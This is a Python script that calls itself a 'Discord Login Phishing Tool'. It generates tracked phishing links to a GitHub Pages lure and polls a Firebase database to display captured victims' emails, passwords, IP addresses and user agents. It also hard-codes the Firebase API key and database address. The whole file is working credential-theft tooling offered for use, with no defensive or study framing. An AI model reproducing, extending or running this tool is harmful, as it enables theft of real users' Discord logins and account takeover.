import os
import json
import pyrebase
import datetime
from colorama import Fore, Style, init
import requests
import time
import webbrowser
import uuid

# Initialize colorama
init()

# Firebase configuration
config = {
    "apiKey": "AIzaSyBKHWkWtRVBqAzZrTFRPEcUGCkTtMUZhVA",
    "authDomain": "xcago-login.firebaseapp.com",
    "databaseURL": "https://xcago-login-default-rtdb.europe-west1.firebasedatabase.app",
    "storageBucket": "xcago-login.appspot.com"
}

# Initialize Firebase
firebase = pyrebase.initialize_app(config)
db = firebase.database()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = """
    ██████╗ ██╗███████╗     ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
    ██╔══██╗██║██╔════╝     ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
    ██║  ██║██║███████╗     ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
    ██║  ██║██║╚════██║     ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
    ██████╔╝██║███████║     ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
    ╚═════╝ ╚═╝╚══════╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                                                
                        Discord Login Phishing Tool
                        Author: @deadcode112
    """
    print(Fore.CYAN + banner + Style.RESET_ALL)

def generate_unique_id():
    return str(uuid.uuid4())[:8]

def get_phishing_link(uid):
    base_url = "https://deadcode112.github.io/discord/"
    return f"{base_url}?uid={uid}"

def monitor_victims(uid):
    clear()
    print_banner()
    print(f"\n{Fore.YELLOW}Monitoring victims for UID: {uid}{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}Your phishing link: {get_phishing_link(uid)}{Style.RESET_ALL}")
    print("\nWaiting for victims... Press Ctrl+C to exit\n")
    
    try:
        while True:
            # Get all victims
            victims = db.child("discord_logins").get()
            if victims.each():
                clear()
                print_banner()
                print(f"\n{Fore.YELLOW}Victims for UID: {uid}{Style.RESET_ALL}")
                print(f"\n{Fore.CYAN}Your phishing link: {get_phishing_link(uid)}{Style.RESET_ALL}\n")
                
                # Filter and display victims for this UID
                victim_count = 0
                for victim in victims.each():
                    victim_data = victim.val()
                    if victim_data.get('uid') == uid:
                        victim_count += 1
                        print(f"{Fore.GREEN}[+] Victim #{victim_count}:{Style.RESET_ALL}")
                        print(f"    Email: {Fore.YELLOW}{victim_data.get('email')}{Style.RESET_ALL}")
                        print(f"    Password: {Fore.YELLOW}{victim_data.get('password')}{Style.RESET_ALL}")
                        print(f"    Time: {Fore.CYAN}{victim_data.get('timestamp')}{Style.RESET_ALL}")
                        print(f"    IP: {Fore.CYAN}{victim_data.get('ip', 'Unknown')}{Style.RESET_ALL}")
                        print(f"    User Agent: {Fore.CYAN}{victim_data.get('userAgent', 'Unknown')}{Style.RESET_ALL}\n")
                
                if victim_count == 0:
                    print(f"{Fore.RED}No victims found for your UID yet.{Style.RESET_ALL}\n")
                    
            time.sleep(2)  # Check for new victims every 2 seconds
            
    except KeyboardInterrupt:
        print("\n\nExiting monitor mode...")
        return

def main():
    clear()
    print_banner()
    
    print(f"\n{Fore.YELLOW}[1] Generate new phishing link")
    print(f"[2] Monitor existing link")
    print(f"[3] Exit{Style.RESET_ALL}")
    
    choice = input("\nEnter your choice (1-3): ")
    
    if choice == "1":
        uid = generate_unique_id()
        phishing_link = get_phishing_link(uid)
        print(f"\n{Fore.GREEN}Generated new phishing link:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{phishing_link}{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}Your UID: {uid} (save this for monitoring){Style.RESET_ALL}")
        input("\nPress Enter to start monitoring...")
        monitor_victims(uid)
        
    elif choice == "2":
        uid = input("\nEnter your UID: ")
        monitor_victims(uid)
        
    elif choice == "3":
        print("\nExiting...")
        exit()
        
    else:
        print(f"\n{Fore.RED}Invalid choice!{Style.RESET_ALL}")
        time.sleep(2)
        main()

if __name__ == "__main__":
    main()